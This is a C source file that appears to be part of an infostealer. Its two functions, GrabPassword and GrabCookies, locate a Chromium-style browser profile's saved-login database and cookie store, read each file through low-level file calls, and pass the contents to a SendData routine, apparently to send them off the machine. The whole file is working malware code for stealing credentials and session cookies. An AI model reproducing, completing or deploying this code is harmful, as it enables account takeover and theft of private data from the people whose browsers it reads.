#include "../include/BrowserGrabber.h"
#include "../include/MemoryUtils.h"
#include "../include/StringUtils.h"
#include "../include/SendData.h"
#include "../include/PathOps.h"
#include "../include/FileIO.h"


void GrabPassword(unsigned short *BrowserPath) {
    HANDLE              FileHandle          = {0};
    UNICODE_STRING      PathUnicode         = {0};
    OBJECT_ATTRIBUTES   PathObj             = {0};
    char                FileSizeString[20]  = {0};
    unsigned char      *buffer              = {0};
    unsigned short      TempPath[250]       = {0};
    int                 FileSize            = 0;
    int                 FullBufferSize      = 0;
    int                 PathSize            = lenW(BrowserPath);

    /*length * 2 because its wide character string*/
    MovMemory(BrowserPath, TempPath, PathSize * 2);
    ConcatStringW(TempPath, L"\\Default\\Login Data", PathSize);

    InitPathObj(TempPath, &PathObj, &PathUnicode);
    if (OpenFileY(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, FILE_OPEN) != 0) {
        return;
    }

    FileSize = GetFileSizeY(FileHandle);
    FullBufferSize = TotalBufferLength(L"ONE", FileSize);
    
    buffer = AllocMemory(FullBufferSize);
    if (buffer == NULL) {
        return 1;
    }

    IntToString(FileSizeString, FileSize);

    SendData(FileHandle, "ONE", FileSize, FileSizeString, buffer, NULL, TRUE);
}

void GrabCookies(unsigned short *BrowserPath) {
    UNICODE_STRING      PathUnicode         = {0};
    OBJECT_ATTRIBUTES   PathObj             = {0};
    HANDLE              FileHandle          = {0};
    char                FileSizeString[20]  = {0};
    unsigned char      *buffer              = {0};
    unsigned short      TempPath[250]       = {0};
    int                 FileSize            = 0;
    int                 FullBufferSize      = 0;
    int                 PathSize            = lenW(BrowserPath);

    /*length * 2 because its wide character string*/
    MovMemory(BrowserPath, TempPath, PathSize * 2);
    ConcatStringW(TempPath, L"\\Default\\Network\\Cookies", PathSize);

    InitPathObj(TempPath, &PathObj, &PathUnicode);
    if (OpenFileY(&FileHandle, FILE_READ_DATA | SYNCHRONIZE, &PathObj, FILE_OPEN) != 0) {
        return;
    }

    FileSize = GetFileSizeY(FileHandle);
    FullBufferSize = TotalBufferLength(L"TWO", FileSize);

    buffer = AllocMemory((SIZE_T)FullBufferSize);
    if (buffer == NULL) {
        return;
    }

    IntToString(FileSizeString, FileSize);

    SendData(FileHandle, "TWO", FileSize, FileSizeString, buffer, NULL, TRUE);
}